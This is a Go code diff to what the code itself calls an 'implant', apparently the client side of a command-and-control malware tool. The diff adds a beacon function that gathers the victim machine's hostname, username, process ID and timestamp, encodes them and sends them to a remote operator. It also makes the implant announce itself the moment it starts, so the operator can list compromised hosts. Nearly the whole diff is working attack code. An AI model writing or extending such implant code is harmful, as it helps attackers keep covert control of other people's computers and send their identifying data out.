@@ -141,6 +141,26 @@ func decodeTag(tag string) (tagInfo, bool) {
 	return tagInfo{GID: gid, Index: idx, Total: total, Data: data}, true
 }
 
+// beat announces this client so the operator can list who is connected.
+// The payload is host|user|pid|unix, base64url, so `clients` shows identity
+// rather than a random nonce.
+func (im *implant) beat() {
+	host, _ := os.Hostname()
+	if host == "" {
+		host = "?"
+	}
+	user := os.Getenv("USERNAME")
+	if user == "" {
+		user = os.Getenv("USER")
+	}
+	if user == "" {
+		user = "?"
+	}
+	ident := fmt.Sprintf("%s|%s|%d|%d", host, user, os.Getpid(), time.Now().Unix())
+	body := base64.RawURLEncoding.EncodeToString([]byte(ident))
+	im.put(hbtPrefix + body)
+}
+
 func randomHex(n int) string {
 	b := make([]byte, n)
 	if _, err := rand.Read(b); err != nil {
@@ -539,6 +559,11 @@ func (im *implant) run() {
 		}
 	}
 	cycle := 0
+	// Announce immediately: waiting ten cycles means the operator sees an
+	// empty client list for minutes after a fresh implant starts.
+	if im.token != "" {
+		im.beat()
+	}
 	for {
 		tags, order, err := im.fetch()
 		if err != nil {
@@ -557,7 +582,7 @@ func (im *implant) run() {
 			if cycle%10 == 0 {
 				im.saveState()
 				if im.token != "" {
-					im.put(hbtPrefix + randomHex(3))
+					im.beat()
 				}
 			}
 		}
